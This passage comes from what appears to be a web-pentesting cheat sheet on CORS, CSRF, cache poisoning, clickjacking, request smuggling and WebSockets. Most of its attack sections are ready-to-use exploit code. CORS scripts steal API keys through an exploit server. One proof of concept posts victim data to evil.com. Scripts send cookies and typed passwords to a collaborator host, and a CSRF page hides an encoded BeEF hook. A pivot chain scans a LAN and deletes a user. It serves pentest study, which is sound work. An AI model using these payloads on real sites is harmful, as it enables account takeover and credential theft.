<tr><td style="text-align: left">http://normal-website.com:8080/example/</td><td style="text-align: left">No: different port</td></tr>
</tbody></table>
</div>
<p>In any site disclosing users &amp; passwords (or other sensitive info), try CORS.</p>
<pre><code class="language-text"># Simple test
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'

# There are various exceptions to the same-origin policy:
• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
• The replace function can generally be called cross-domain on the location object.
• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.

# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.

CORS good example:
https://hackerone.com/reports/235200

- CORS with basic origin reflection:

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
    Observe that the origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab and test it by clicking "view exploit":
    &lt;script&gt;
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='/log?key='+this.responseText;
       };
    &lt;/script&gt;
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

 - Whitelisted null origin value

     With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "My account".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
    Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab, $exploit-server-url with the exploit server URL, and test it by clicking "view exploit":
    &lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, &lt;script&gt;
       var req = new XMLHttpRequest ();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
       };
    &lt;/script&gt;"&gt;&lt;/iframe&gt;
    Notice the use of an iframe sandbox as this generates a null origin request. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with insecure certificate

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
    Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
    Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
    Observe that the productID parameter is vulnerable to XSS.
    Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking "view exploit":
    &lt;script&gt;
       document.location="http://stock.$your-lab-url/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"
    &lt;/script&gt;
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with pivot attack

Step 1
First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
&lt;script&gt;
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i&lt;=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i&lt;=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=&gt;r.text().then(text=&gt;
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now()
  }
  ))
  .catch(e =&gt; {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=&gt;{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
&lt;/script&gt;
Step 2
Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
&lt;script&gt;
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, '"&gt;&lt;img src='+collaboratorURL+'?foundXSS=1&gt;');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;

Step 3
Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
&lt;script&gt;
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, '"&gt;&lt;iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;
Step 4
Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
&lt;script&gt;
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=&gt;r.text().then(text=&gt;
  {
    xss(url, text, '"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"&gt;');
  }
  ))
}

fetchUrl("http://$ip");
&lt;/script&gt;
Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.

# JSONP

In GET URL append “?callback=testjsonp”
Response should be:
testjsonp(&lt;json-data&gt;)

# Bypasses
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
</code></pre>
<h2 id="cors-poc"><a class="header" href="#cors-poc"><strong>CORS PoC</strong></a></h2>
<pre><code class="language-text">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;CORS PoC Exploit&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;

&lt;h1&gt;CORS Exploit&lt;br&gt;six2dez&lt;/h1&gt;
&lt;hr&gt;
&lt;div id="demo"&gt;
&lt;button type="button" onclick="cors()"&gt;Exploit&lt;/button&gt;
&lt;/div&gt;
&lt;script type="text/javascript"&gt;
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 &amp;&amp; this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
 xhttp.open("GET", "http://&lt;vulnerable-url&gt;", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
&lt;/script&gt;

&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="cors-poc-2"><a class="header" href="#cors-poc-2"><strong>CORS PoC 2</strong></a></h2>
<pre><code class="language-text">&lt;html&gt;
&lt;script&gt;
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 &amp;&amp; http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<h2 id="cors-poc-3---sensitive-data-leakage"><a class="header" href="#cors-poc-3---sensitive-data-leakage">CORS PoC 3 - Sensitive Data Leakage</a></h2>
<pre><code class="language-text">&lt;html&gt;
&lt;body&gt;
&lt;button type='button' onclick='cors()'&gt;CORS&lt;/button&gt;
&lt;p id='corspoc'&gt;&lt;/p&gt;
&lt;script&gt;
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 &amp;&amp; this.status == 200) {
var a = this.responseText; // Sensitive data from target1337.com about user account
document.getElementById("corspoc").innerHTML = a;
xhttp.open("POST", "https://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("POST", "https://target1337.com", true);
xhttp.withCredentials = true;
var body = "requestcontent";
var aBody = new Uint8Array(body.length);
for (var i = 0; i &lt; aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhttp.send(new Blob([aBody]));
}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="cors-json-poc"><a class="header" href="#cors-json-poc"><strong>CORS JSON PoC</strong></a></h2>
<pre><code class="language-text">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;JSONP PoC&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;

&lt;h1&gt;JSONP Exploit&lt;br&gt;YourTitle&lt;/h1&gt;
&lt;hr&gt;
&lt;div id="demo"&gt;
&lt;button type="button" onclick="trigger()"&gt;Exploit&lt;/button&gt;
&lt;/div&gt;
&lt;script&gt;

function testjsonp(myObj) {
  var result = JSON.stringify(myObj)
  document.getElementById("demo").innerHTML = result;
  //console.log(myObj)
}

&lt;/script&gt;

&lt;script &gt;

  function trigger() {
    var s = document.createElement("script");
    s.src = "https://&lt;vulnerable-endpoint&gt;?callback=testjsonp";
    document.body.appendChild(s);
}

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csrf"><a class="header" href="#csrf">CSRF</a></h1>
<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
<p><b> Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
</b>
</br></p>
<p>3 conditions:</p>
<ul>
<li>A relevant action.</li>
<li>Cookie-based session handling.</li>
<li>No unpredictable request parameters.</li>
</ul>
<p>How to find:</p>
<ul>
<li>Remove CSRF token from requests and/or put a blank space.</li>
<li>Change POST to GET.</li>
<li>Replace the CSRF token with a random value (for example 1).</li>
<li>Replace the CSRF token with a random token of the same restraints.</li>
<li>Extract token with HTML injection.</li>
<li>Use a CSRF token that has been used before.</li>
<li>Bypass regex.</li>
<li>Remove referer header.</li>
<li>Request a CSRF by executing the call manually and use that token for the request.</li>
</ul>
<h3 id="approach"><a class="header" href="#approach">Approach</a></h3>
<pre><code>- Removing the token parameter entirely
- Setting the token to a blank string
- Changing the token to an invalid token of the same format
- Using a different user's token
- Put the parameters in the URL instead of POST body (and remove the token) and change the HTTP verb to GET
- Testing every sensitive endpoint
- Check whether the token might be guessed / cracked
- Check whether new tokens are generated for every session, if not they may be a hash of something simple like the user's email address. If so you can craft your own valid tokens.
- Try building the payload with multiple methods including a standard HTML form, multipart form, and XHR (Burp can help)
</code></pre>
<h3 id="quick-attacks"><a class="header" href="#quick-attacks">Quick attacks</a></h3>
<pre><code class="language-markup"># HTML GET
&lt;a href=”http://vulnerable/endpoint?parameter=CSRFd"&gt;Click&lt;/a&gt;

# HTML GET (no interaction)
&lt;img src=”http://vulnerable/endpoint?parameter=CSRFd"&gt;

# HTML POST:
&lt;form action="http://vulnerable/endpoint" method="POST"&gt;
&lt;input name="parameter" type="hidden" value="CSRFd" /&gt;
&lt;input type="submit" value="Submit Request" /&gt;
&lt;/form&gt;

# HTML POST (no interaction)
&lt;form id="autosubmit" action="http://vulnerable/endpoint" method="POST"&gt;
&lt;input name="parameter" type="hidden" value="CSRFd" /&gt;
&lt;input type="submit" value="Submit Request" /&gt;
&lt;/form&gt;
&lt;script&gt;
document.getElementById("autosubmit").submit();
&lt;/script&gt;

# JSON GET:
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://vulnerable/endpoint");
xhr.send();
&lt;/script&gt;

# JSON POST
&lt;script&gt;
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable/endpoint");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
&lt;/script&gt;
</code></pre>
<h2 id="tools-9"><a class="header" href="#tools-9">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/0xInfection/XSRFProbe
xsrfprobe --help

https://csrfshark.github.io/
</code></pre>
<h2 id="example-1"><a class="header" href="#example-1">Example 1</a></h2>
<pre><code class="language-markup">Vulnerable request example:
__
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
__

HTML with attack:
__
&lt;html&gt;
  &lt;body&gt;
    &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt;
      &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
__
</code></pre>
<h2 id="example-2"><a class="header" href="#example-2">Example 2</a></h2>
<pre><code class="language-markup"># Exploit CSRF in GET:
&lt;img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"&gt;

- SameSite cookie property avoid the attack:
   → Only from same site:
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; 
   → From other site only if GET and requested by click, not scripts (vulnerable if CSRF in GET or POST converted to GET):    
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; 

&lt;script&gt;
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;

&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;
</code></pre>
<h2 id="json-csrf"><a class="header" href="#json-csrf"><strong>Json CSRF</strong></a></h2>
<pre><code>Requirements:

1. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks)
2. The HTTP request should not be fortify by the custom random token on the header as well in the body.(X-Auth-Token)
3. The HTTP request should not be fortify by the Same Origin Policy.

Bypass 2 &amp; 3:
• Change the request method to GET append the body as query parameter.
• Test the request without the Customized Token (X-Auth-Token) and also header.
• Test the request with exact same length but different token.

If post is not allowed, can try with URL/param?_method=PUT


&lt;body onload='document.forms[0].submit()'&gt;
&lt;form action="https://&lt;vulnerable-url&gt;?_method=PUT" method="POST" enctype="text/plain"&gt;
  &lt;input type="text" name='{"username":"blob","dummy":"' value='"}'&gt;
  &lt;input type="submit" value="send"&gt;
&lt;/form&gt;

&lt;!---This results in a request body of:
{"username":"blob", "dummy": "="} --&gt;
</code></pre>
<h2 id="csrf-token-bypass"><a class="header" href="#csrf-token-bypass"><strong>CSRF Token Bypass</strong></a></h2>
<pre><code>CSRF Tokens

Unpredictable value generated from the server to the client, when a second request is made, server validate this token and reject the request if is missing or invalid. Prevent CSRF attack because the malicious HTTP request formed can't know the CSRF Token generated for the victim.
   → Is transmited to the client through a hidden field:


- Example:
    __
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=wiener@normal-user.com
    __

- Validation depends on method (usually POST):
    __
    GET /email/change?email=pwned@evil-user.net HTTP/1.1
    Host: vulnerable-website.com
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
    __

- Validation depend on token is present (if not, validation is skipped):
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    email=pwned@evil-user.net
    --
- CSRF not tied to user session

- CSRF tied to a non-session cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

    csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
    --

- CSRF token duplicated in cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

    csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com
    --

- Validation of referer depends on header present (if not, validation is skipped)

- Circumvent referer validation (if only checks the domain existence)

- Remove Anti-CSRF Token
- Spoof Anti-CSRF Token by Changing a few bits
- Using Same Anti-CSRF Token
- Weak Cryptography to generate Anti-CSRF Token
- Guessable Anti-CSRF Token
- Stealing Token with other attacks such as XSS.
- Converting POST Request to GET Request to bypass the CSRF Token Check. (This is what we will see for this article)

Other validations bypasses:
1) remove anticsrf tokens &amp; parameter
2) pass blank paramter
3) add same length token
4) add another userss valid anti csrf token
5) random token in long length (aaaaaaaaa) 
6) Try decode token
7) Use only static part of the token
</code></pre>
<h2 id="csrf-sample-poc"><a class="header" href="#csrf-sample-poc">CSRF sample POC</a></h2>
<pre><code>&lt;html&gt;
&lt;script&gt;
function jsonreq() {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open("POST","https://target.com/api/endpoint", true);
  xmlhttp.setRequestHeader("Content-Type","text/plain");
  //xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xmlhttp.withCredentials = true;
  xmlhttp.send(JSON.stringify({"test":"x"}));
}
jsonreq();
&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<h2 id="csrf-to-reflected-xss"><a class="header" href="#csrf-to-reflected-xss">CSRF to reflected XSS</a></h2>
<pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;Please wait... ;)&lt;/p&gt;
    &lt;script&gt;
let host = 'http://target.com'
let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'

function submitRequest() {
  var req = new XMLHttpRequest();
  req.open(&lt;CSRF components, which can easily be copied from Burp's POC generator&gt;);
  req.setRequestHeader("Accept", "*\/*");
  req.withCredentials = true;
  req.onreadystatechange = function () {
    if (req.readyState === 4) {
      executeXSS();
    }
  }
  req.send();
}

function executeXSS() {
  window.location.assign(host+'&lt;URI with XSS&gt;'+alert_payload);
}

submitRequest();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="mindmaps"><a class="header" href="#mindmaps">Mindmaps</a></h2>
<p><img src="https://camo.githubusercontent.com/1216587b905ccfe5114a4420caad3369e49d57c12d9c837a78330733540f9a12/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f4559373062786b576b4141467a47623f666f726d61743d6a7067266e616d653d39303078393030" alt="" /></p>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(51).png" alt="" /></p>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(31).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-cache-poisoning"><a class="header" href="#web-cache-poisoning">Web Cache Poisoning</a></h1>
<h2 id="general-1"><a class="header" href="#general-1">General</a></h2>
<p>
Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.
<p>Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.</p>
<p>A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.</p>
</p>
<h2 id="tools-10"><a class="header" href="#tools-10">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
wcvs -u https://url.com
# https://github.com/s0md3v/Arjun
python3 arjun.py -u https://url.com --get 
python3 arjun.py -u https://url.com --post
# https://github.com/maK-/parameth
python parameth.py -u https://example.com/test.php
# https://github.com/devanshbatham/ParamSpider
python3 paramspider.py --domain example.com
# https://github.com/s0md3v/Parth
python3 parth.py -t example.com
</code></pre>
<pre><code class="language-markup"># XSS for users accessing /en?region=uk:
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="broken-links"><a class="header" href="#broken-links">Broken Links</a></h1>
<h2 id="tools-11"><a class="header" href="#tools-11">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/stevenvachon/broken-link-checker 
blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="clickjacking"><a class="header" href="#clickjacking">Clickjacking</a></h1>
<h2 id="general-2"><a class="header" href="#general-2">General</a></h2>
<p>
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
</p>
</br> 
<ul>
<li>Preventions:</li>
<li>X-Frame-Options: deny/sameorigin/allow-from</li>
<li>CSP: policy/frame-ancestors 'none/self/domain.com'</li>
</ul>
<pre><code class="language-markup"># An example using the style tag and parameters is as follows:
&lt;head&gt;
  &lt;style&gt;
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  &lt;/style&gt;
&lt;/head&gt;
...
&lt;body&gt;
  &lt;div id="decoy_website"&gt;
  ...decoy web content here...
  &lt;/div&gt;
  &lt;iframe id="target_website" src="https://vulnerable-website.com"&gt;
  &lt;/iframe&gt;
&lt;/body&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="http-request-smuggling"><a class="header" href="#http-request-smuggling">HTTP Request Smuggling</a></h1>
<h2 id="general-3"><a class="header" href="#general-3">General</a></h2>
<p>
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers: Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
</p>
<h2 id="tools-12"><a class="header" href="#tools-12">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/defparam/smuggler
python3 smuggler.py -u &lt;URL&gt;
# https://github.com/defparam/tiscripts

# https://github.com/anshumanpattnaik/http-request-smuggling/
python3 smuggle.py -u &lt;URL&gt;

# https://github.com/assetnote/h2csmuggler
go run ./cmd/h2csmuggler check https://google.com/ http://localhost


# HTTP/2
# https://github.com/BishopFox/h2csmuggler
</code></pre>
<h2 id="samples"><a class="header" href="#samples">Samples</a></h2>
<pre><code class="language-http">- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:

    POST /search HTTP/1.1
    Host: normal-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11

    q=smuggling

- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

    POST /search HTTP/1.1
    Host: normal-website.com
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked

    b
    q=smuggling
    0



• CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
   ◇ Find - time delay:
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 4

    1
    A
    X
• TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
   ◇ Find time delay:
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X
• TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

- CL.TE
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    The second response should say: Unrecognized method GPOST.

 - TE.CL
    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked

    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0

 - TE.TE: obfuscating TE Header
     In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: cow

    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
</code></pre>
<p><img src="enumeration/web/../../.gitbook/assets/20200520131941%5B1%5D.jpg" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-sockets"><a class="header" href="#web-sockets">Web Sockets</a></h1>
<pre><code>WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.

WebSocket connections are normally created using client-side JavaScript like the following:
var ws = new WebSocket("wss://normal-website.com/chat");

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

If the server accepts the connection, it returns a WebSocket handshake response like the following:
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=

Several features of the WebSocket handshake messages are worth noting:
• The Connection and Upgrade headers in the request and response indicate that this is a WebSocket handshake.
• The Sec-WebSocket-Version request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
